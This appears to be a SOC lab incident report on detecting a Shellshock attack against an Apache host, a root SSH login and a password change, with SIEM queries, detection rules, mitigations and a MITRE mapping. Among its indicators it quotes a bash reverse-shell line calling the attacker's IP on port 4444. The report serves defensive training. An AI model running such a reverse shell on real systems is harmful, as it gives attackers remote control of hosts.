# Shellshock Exploitation Incident Report  
A concise SOC lab report on detection, investigation, and mitigation of Shellshock and privilege abuse.

## Executive Summary
On April 16, 2025, malicious activity originating from source IP `192.168.52.69` targeted the Apache web server on host `appsrv05`. The attacker attempted Shellshock exploitation via multiple `/cgi-bin` endpoints, followed by a successful SSH login as `root`. Post-compromise, the attacker changed user credentials and executed commands with elevated privileges. This incident highlights critical vulnerabilities in unpatched systems and weak access controls, leading to full system compromise.

## Investigation
- **Detection Source**: Elastic Security SIEM
- **Datasets Queried**: `apache.access`, `system.auth`
- **Queries Used**:
  ```kql
  # Phase 1: Identify suspicious Apache access logs
  event.dataset: "apache.access" AND source.ip: "192.168.52.69"

  # Phase 2: Detect Shellshock exploitation attempts
  source.ip: "192.168.52.69" AND url.path: "/cgi-*"

  # Phase 3: Identify authentication events from attacker IP
  source.ip: "192.168.52.69" AND event.dataset: "system.auth"
  ```
- **Observed Behavior**:
  - Phase 1: Initial reconnaissance with custom user-agent `attacker03`.
  - Phase 2: Repeated attempts to exploit Shellshock via `/cgi-bin` endpoints, with payloads attempting reverse shell connections to port `4444`.
  - Phase 3: Successful SSH login as `root` from attacker IP, followed by credential refresh and password change using `usermod`.

## Findings
- **Source IP / Host**: `192.168.52.69`
- **Target Hosts / Accounts**: `appsrv05`, `root` account
- **Indicators**:
  - Multiple `/cgi-bin` requests with Shellshock payloads
  - Reverse shell attempt: `/bin/bash -i >& /dev/tcp/192.168.52.69/4444`
  - Successful SSH login as `root` via password authentication
  - Execution of `/usr/sbin/usermod` and `/home/offsec/bash-4.3/bash`
- **Outcome**: Successful exploitation and privilege escalation. Attacker gained root access and modified system credentials.

## Detection Logic
- Apache access logs flagged unusual user-agent strings and repeated `/cgi-bin` requests.
- Detection rule: Alert when >10 requests to `/cgi-bin` endpoints within 5 minutes from the same IP.
- Authentication logs flagged multiple successful root logins from external IPs within seconds.

## Recommendations
- **Containment**:
  - Immediately block source IP `192.168.52.69`.
  - Isolate compromised host `appsrv05`.
  - Disable compromised root account and reset credentials.
- **Preventive Measures**:
  - Patch Apache and Bash against Shellshock vulnerabilities.
  - Enforce least privilege: disable direct root login via SSH.
  - Implement MFA for administrative accounts.
  - Restrict sudo usage and audit privilege changes regularly.
- **Monitoring Improvements**:
  - Add detection rules for anomalous user-agent strings.
  - Monitor for reverse shell payload patterns in HTTP requests.
  - Enhance dashboards for privilege escalation detection.

## MITRE ATT&CK Mapping
- **Technique**: 
  - T1190: Exploit Public-Facing Application (Shellshock)
  - T1059: Command and Scripting Interpreter (Bash reverse shell)
  - T1078: Valid Accounts (SSH root login)
  - T1098: Account Manipulation (Password change via `usermod`)
- **Tactic**: Initial Access, Execution, Persistence, Privilege Escalation

## Lessons Learned
This incident demonstrates the importance of timely patching and strict access controls. Allowing root SSH login created a direct path for escalation. Detection rules must account for enumeration attempts and exploit payloads. In a real SOC environment, proactive threat hunting and privilege monitoring would reduce response time and limit attacker impact. False positives may occur with legitimate CGI requests, but tuning thresholds and correlating with authentication logs improves accuracy.
